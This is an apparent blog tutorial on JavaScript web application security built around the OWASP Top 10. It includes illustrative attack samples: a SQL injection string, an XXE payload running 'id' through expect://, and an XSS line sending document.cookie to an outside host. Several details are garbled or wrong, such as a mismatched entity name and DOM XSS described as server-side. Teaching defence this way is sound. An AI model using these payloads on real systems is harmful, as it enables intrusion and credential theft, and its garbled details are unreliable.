## JavaScript Web Application Security Guide

JavaScript is the most popular language if we talk about web development since its release in 1995. It's rising in popularity for its browser-side scripting, as well as server-side scripting. Creating a web app means you are ready to expose your product to millions of users. This makes it obvious that dozens of vulnerabilities need to be handled in all the production-ready apps, as security is not the enhanced version of an application, but it is a part of a developer’s job

**Note:** This article focuses on concepts which make “**web apps more secure**”

# **OWASP 10 — Open Web Application Security Project**

The OWASP community aims to raise awareness of web application security. Let us understand the 10 projects aimed by OWASP which help to develop more secured web apps_

### **1\. Injection**

This includes a common type of injection **—** SQL, NoSQL, LDAP (Lightweight Directory access protocol) This can lead to denial of access, huge data loss & data corruption

**For Example —**


```
Query = “SELECT * FROM finance_details WHERE userid=’” + request.getParameter(“id“) + “‘“;</span>
```


_In such case, “id” parameter value can be modified in the browser to send:_ **_` or `1`=`1_**`

[_http://example.com/app/FinanceData?id='_](http://example.com/app/FinanceData?id=') or `1`=`1`

This will return all the records from the finance_details table, which is dangerous_

### **2\. Broken Authentication and Session Management**

Missing MFA(Multi-Factor Authentication), saving plain text passwords or weakly passwords, incorrectly configured session tokens/ids could allow the attackers to get access of users credentials from the stateful applications

**_For Example_** _—_

*   Predictable Login Credentials.
*   User authentication Credentials are not protected when stored.
*   Session IDs are used in the URL
*   Session Value does not timeout or does not get validated after logout

### **3\. Sensitive Data Exposure**

Sensitive data like passwords, finance data, if not encrypted or stored with strong standard algorithms attackers could brute force the databases, steal sensitive information or users identities

**For example** —

_An application storing the credit card numbers in an encrypted format in a database. While retrieval they are decrypted allowing the hacker to perform a SQL injection attack to retrieve all the sensitive data. This can be avoided by encrypting the credit card numbers using a public key and allowed back-end applications to decrypt them with the private key_

### **4\.** XXE (**XML External Entity)**

XML documents which contain untrusted data can exploit XML processors. This enables the attackers to access the remote server data and perform the denial-of-service attack

**For Example —**

**Remote Code Execution**

_Let’s modify the payload_


```
_<?xml version=”1.0" encoding=”ISO-8859–1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY_ **_xml_** _SYSTEM_ **_“expect://id”_** _>]>
<creds>
 <user>_**_&jd;_**_</user>
 <pass>pass</pass>
</creds>_</span>
```


The response from the server will be something like:_

**_You have logged in as user uid=0(root) gid=0(root) groups=0(root)_**

### **5\. Broken Access Control**

Misconfigured users authentication can allow users to access the unauthorized data and functionality which enable them to edit, create, delete every single record

**For example —**

The attacker can modify the acct_id parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.

[_http://example.com/app/FinanceData?_](http://example.com/app/FinanceData?id=')_acct_id=1

### **6\. Security Misconfiguration**

Security misconfiguration refers to missing an appropriate security measure at any level of the application stack. Such a flaw could lead to a complete system compromise

**_For example-_**

1.  _Not disabling default accounts with well-known passwords_
2.  _Not setting the response headers, or using insecure values into it_

### **7\. Cross-Site Scripting**

Cross-site scripting is an application vulnerability that attackers sent down untrusted data to the browser which get executed instead of just being displayed in the browser. It is a violation of the **same-origin policy.**

_Reflected XSS, Stored XSS, DOM XSS are three forms of cross-site scripting:_

**Reflected XSS —** In this, the attackers provide the URL which includes the malicious script straight into the HTML and JavaScript in the browser

**Stored XSS —** Here, the malicious code is stored in the database which is high-risk cross-site scripting. Then the victim is able to retrieve the stored data from the web application

**DOM XSS —** In this the attackers manipulate the DOM which is then sent as the payload executing the HTTP request. This is determined to be a server-side attack

**For example —**

_The application can pass untrusted and unwanted data in the HTML input_


```
<script>window.location = 'xyza.com? cookie=' + document.cookie</script></span>
```


### **8\. Insecure deserialization**

Insecure deserialization can lead to remote code execution, access-control-related attacks and tampering attacks

### **9\. Using Components With Known Vulnerabilities**

This basically relates to the third-party modules. Most of the developers may not know which version of modules are added into the applications which make it difficult to update components with security patches. Attackers may steal sensitive information

### **10\. Insufficient Logging and Monitoring**

Logging and monitoring systems should be implemented to report the failures responses in a timely. It should take a maximum of 24 hrs to report the incident and trigger the alert to prevent damages caused to the system. The attackers rely on lack of monitoring and timely response to maintain persistent threats.

**Now, let's discuss some more techniques and tools used to secure and test the web applications**

## **Http Response Headers**

Implementing Http Response Headers aims to secure the browser vulnerabilities by enabling both the HTTP client and server to send and receive metadata about the connection to be established, the resource being requested, as well as the returned resource itself, thus balancing the usability and security of the application

## **SSL / HTTPS**

SSL (Secured socket layer) operates at the presentation layer in the **OSI model**. SSL encryption is done between the web browser and the web server around the HTTP protocol. Use of SSL/HTTPS ensured the data is encrypted while interacting with users data into the browsers. Its extremely important to add security to log in, checkout, cart, account pages with SSL

## **Cookies**

Using the **“secure”** flag while setting the cookies to avoid the disclosure of a cookie containing a piece of sensitive information. The current version of browsers has this built-in security. Sensitive information like passwords must not be stored inside cookies, otherwise, this may get cached on the client-side. Using headers to disable caching to reduce the risk of leaking data due to caching

### **Input validation**

Input validation is the first line of defence to protect against the risk of getting unexpected results from the bad inputs received by the system. It is the process of ensuring input data is consistent with application expectations. Basic input validation only ensures where the input value received is null or non-null or whether the integer is positive, but we need to think more on limiting the inputs only with logically acceptable values

### Hash and salt users password

While developing an application, it is quite important to protect your user's assets. Storing the strong hashed password in the database using a javascript library called **bcrypt** can protect the users while data transmission

### Don’t Eval()

Running eval() against any code that may have been tampered with — for example, strings taken from the page query string. Untrusted code can leave you vulnerable to [**cross-site scripting**](http://en.wikipedia.org/wiki/Cross_site_scripting) **attacks**

### **Rate Limit Login attempts — IP & Username**

You should rate-limit the login attempts made by the users with IP as well as username who failed login on multiple attempts

### Third-party modules

Third-party modules must not be modified, as the developer may hide malicious code causing damage to applications breakdown. The use of an old version of modules are highly discouraged and must be updated to the latest versions.

### Cross-Site Request Forgery

Also, know as “Sea Surf”, “Session Riding”, is an attack that tricks a web browser to do an unwanted action to the application in which the end-users are authenticated. A CSRF token should be unique to per user session, and generated by a cryptographically random number. CSRF should only be included in **POST** request

### _Tools designed to do “black box” web app penetration testing:_

_1\._ [**_Checkmarx_**](https://www.checkmarx.com/2016/07/20/2016072020160717the-only-way-to-build-effective-and-secure-javascript-applications/) _— It scans source code and identifies security vulnerabilities within the code like SQL Injection, XSS, etc.._

_2\._ [**_Burp suite_**](http://www.portswigger.net)_— Free and commercial tool. Excellent adjunct to manual testing. It has a good scanner capability and is used by most of the web application testers._

_3\._ [**_Fiddler_**](https://www.telerik.com/fiddler) **_—_** _Another proxy tool Fiddler allows you to inspect all HTTP(S) traffic, set breakpoints, and fiddle with incoming or outgoing data_

_5\. For more tools — Visit —_ [_https://www.owasp.org/index.php/Phoenix/Tools_](https://www.owasp.org/index.php/Phoenix/Tools)

If you liked it please leave some claps to show your support. Also, leave your responses below and reach out to me if you face any issues.

Follow me on [Twitter](http://www.twitter.com/beingjaydesai) | Check out my [LinkedIn](https://www.linkedin.com/in/iamjaydesai/) | See my [GitHub](https://github.com/desaijay315)